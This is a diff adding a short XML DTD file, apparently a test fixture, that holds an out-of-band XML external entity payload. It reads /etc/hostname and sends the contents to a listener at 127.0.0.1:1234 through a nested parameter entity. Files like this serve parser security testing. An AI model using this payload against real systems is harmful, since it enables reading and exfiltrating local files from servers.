@@ -1,0 +1,7 @@
+<!ENTITY % filecontents SYSTEM "file:///etc/hostname">
+<!ENTITY % exploit "<!ENTITY &#x25; pwned SYSTEM 'http://127.0.0.1:1234/?x=%filecontents;'>">
+%exploit;
+%pwned;
+
+
+
